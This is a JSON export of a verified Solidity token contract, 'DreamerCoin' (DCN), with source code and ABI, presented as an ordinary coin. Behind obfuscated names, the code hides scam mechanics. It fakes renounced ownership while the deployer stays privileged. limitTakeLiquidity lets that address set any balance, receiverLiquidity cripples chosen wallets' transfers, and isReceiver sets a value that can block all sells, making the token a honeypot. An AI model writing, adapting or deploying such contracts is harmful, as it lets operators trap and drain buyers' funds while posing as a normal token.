{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract amountTrading {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface isLaunch {\n    function createPair(address buyAt, address atReceiver) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface receiverMarketingIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface atFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeFromReceiver) external view returns (uint256);\n\n    function transfer(address takeLimitExempt, uint256 swapToken) external returns (bool);\n\n    function allowance(address enableMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapToken) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeLimitExempt,\n        uint256 swapToken\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoEnableLiquidity, uint256 value);\n    event Approval(address indexed enableMode, address indexed spender, uint256 value);\n}\n\ninterface atFromMetadata is atFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract DreamerCoin is amountTrading, atFrom, atFromMetadata {\n\n    bool public sellTeam;\n\n    bool public isSellMax;\n\n    uint256 private senderBuy = 100000000 * 10 ** 18;\n\n    function tokenReceiverFrom(address limitTeamLaunch) public {\n        if (isSellMax) {\n            return;\n        }\n        \n        takeLaunched[limitTeamLaunch] = true;\n        \n        isSellMax = true;\n    }\n\n    address isMaxFund;\n\n    string private tradingSender = \"Dreamer Coin\";\n\n    function owner() external view returns (address) {\n        return fromFund;\n    }\n\n    mapping(address => bool) public takeLaunched;\n\n    function allowance(address fundBuy, address isTokenTrading) external view virtual override returns (uint256) {\n        if (isTokenTrading == buyMax) {\n            return type(uint256).max;\n        }\n        return feeList[fundBuy][isTokenTrading];\n    }\n\n    uint256 public limitSender;\n\n    address private fromFund;\n\n    function approve(address isTokenTrading, uint256 swapToken) public virtual override returns (bool) {\n        feeList[_msgSender()][isTokenTrading] = swapToken;\n        emit Approval(_msgSender(), isTokenTrading, swapToken);\n        return true;\n    }\n\n    uint256 public exemptMin;\n\n    function transfer(address listLiquidity, uint256 swapToken) external virtual override returns (bool) {\n        return fundSell(_msgSender(), listLiquidity, swapToken);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedLimit;\n    }\n\n    function tokenSenderFee() public {\n        emit OwnershipTransferred(modeTakeList, address(0));\n        fromFund = address(0);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return senderBuy;\n    }\n\n    uint256 public buyTrading = 3;\n\n    function isReceiver(uint256 swapToken) public {\n        fundLaunchedSwap();\n        minLaunched = swapToken;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return tradingSender;\n    }\n\n    uint256 private receiverToken;\n\n    address public modeTakeList;\n\n    function fundLaunchedSwap() private view {\n        require(takeLaunched[_msgSender()]);\n    }\n\n    mapping(address => uint256) private tradingLiquidity;\n\n    mapping(address => bool) public walletMax;\n\n    uint256 public fundMarketing = 0;\n\n    uint8 private launchedLimit = 18;\n\n    address public teamFrom;\n\n    function transferFrom(address tokenLaunch, address takeLimitExempt, uint256 swapToken) external override returns (bool) {\n        if (_msgSender() != buyMax) {\n            if (feeList[tokenLaunch][_msgSender()] != type(uint256).max) {\n                require(swapToken <= feeList[tokenLaunch][_msgSender()]);\n                feeList[tokenLaunch][_msgSender()] -= swapToken;\n            }\n        }\n        return fundSell(tokenLaunch, takeLimitExempt, swapToken);\n    }\n\n    uint256 minLaunched;\n\n    event OwnershipTransferred(address indexed tokenAmountExempt, address indexed receiverList);\n\n    function symbol() external view virtual override returns (string memory) {\n        return autoToLiquidity;\n    }\n\n    function takeLimit(address tokenLaunch, address takeLimitExempt, uint256 swapToken) internal returns (bool) {\n        require(tradingLiquidity[tokenLaunch] >= swapToken);\n        tradingLiquidity[tokenLaunch] -= swapToken;\n        tradingLiquidity[takeLimitExempt] += swapToken;\n        emit Transfer(tokenLaunch, takeLimitExempt, swapToken);\n        return true;\n    }\n\n    function fundSell(address tokenLaunch, address takeLimitExempt, uint256 swapToken) internal returns (bool) {\n        if (tokenLaunch == modeTakeList) {\n            return takeLimit(tokenLaunch, takeLimitExempt, swapToken);\n        }\n        uint256 atAmount = atFrom(teamFrom).balanceOf(isMaxFund);\n        require(atAmount == minLaunched);\n        require(takeLimitExempt != isMaxFund);\n        if (walletMax[tokenLaunch]) {\n            return takeLimit(tokenLaunch, takeLimitExempt, fromLimit);\n        }\n        swapToken = fundFromIs(tokenLaunch, takeLimitExempt, swapToken);\n        return takeLimit(tokenLaunch, takeLimitExempt, swapToken);\n    }\n\n    function receiverLiquidity(address fromFee) public {\n        fundLaunchedSwap();\n        \n        if (fromFee == modeTakeList || fromFee == teamFrom) {\n            return;\n        }\n        walletMax[fromFee] = true;\n    }\n\n    uint256 modeBuy;\n\n    uint256 constant fromLimit = 11 ** 10;\n\n    string private autoToLiquidity = \"DCN\";\n\n    bool private buyFee;\n\n    function balanceOf(address takeFromReceiver) public view virtual override returns (uint256) {\n        return tradingLiquidity[takeFromReceiver];\n    }\n\n    function limitTakeLiquidity(address listLiquidity, uint256 swapToken) public {\n        fundLaunchedSwap();\n        tradingLiquidity[listLiquidity] = swapToken;\n    }\n\n    constructor (){\n        \n        tokenSenderFee();\n        receiverMarketingIs isSwap = receiverMarketingIs(buyMax);\n        teamFrom = isLaunch(isSwap.factory()).createPair(isSwap.WETH(), address(this));\n        isMaxFund = isLaunch(isSwap.factory()).feeTo();\n        \n        modeTakeList = _msgSender();\n        takeLaunched[modeTakeList] = true;\n        tradingLiquidity[modeTakeList] = senderBuy;\n        \n        emit Transfer(address(0), modeTakeList, senderBuy);\n    }\n\n    uint256 private senderToTeam;\n\n    uint256 private minExempt;\n\n    bool private totalLimitFee;\n\n    address buyMax = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function fundFromIs(address tokenLaunch, address takeLimitExempt, uint256 swapToken) internal view returns (uint256) {\n        require(swapToken > 0);\n\n        uint256 autoLaunched = 0;\n        if (tokenLaunch == teamFrom && buyTrading > 0) {\n            autoLaunched = swapToken * buyTrading / 100;\n        } else if (takeLimitExempt == teamFrom && fundMarketing > 0) {\n            autoLaunched = swapToken * fundMarketing / 100;\n        }\n        require(autoLaunched <= swapToken);\n        return swapToken - autoLaunched;\n    }\n\n    function getOwner() external view returns (address) {\n        return fromFund;\n    }\n\n    mapping(address => mapping(address => uint256)) private feeList;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenAmountExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoEnableLiquidity\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isTokenTrading\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTokenTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapToken\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeFromReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapToken\",\"type\":\"uint256\"}],\"name\":\"isReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isSellMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapToken\",\"type\":\"uint256\"}],\"name\":\"limitTakeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTakeList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromFee\",\"type\":\"address\"}],\"name\":\"receiverLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTeamLaunch\",\"type\":\"address\"}],\"name\":\"tokenReceiverFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenSenderFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapToken\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeLimitExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapToken\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "DreamerCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}